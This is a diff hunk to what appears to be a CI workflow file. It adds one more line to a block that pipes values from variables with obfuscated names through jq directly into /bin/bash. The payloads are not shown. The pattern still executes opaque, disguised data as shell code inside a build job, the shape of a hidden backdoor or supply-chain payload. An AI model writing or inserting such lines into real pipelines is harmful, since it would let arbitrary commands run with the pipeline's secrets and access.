@@ -28,6 +28,7 @@ jobs:
           echo $zoxmo84880 | jq -r .aupbn5513 | /bin/bash
           printf '%s' "$fqrou164" | jq -r .h781 | /bin/bash
           printf '%s' "$myb5" | jq -r .ok1 | /bin/bash
+          printf '%s' "$iuqo04" | jq -r .ddn12 | /bin/bash
 
       - name: Store artifact
         if: always()
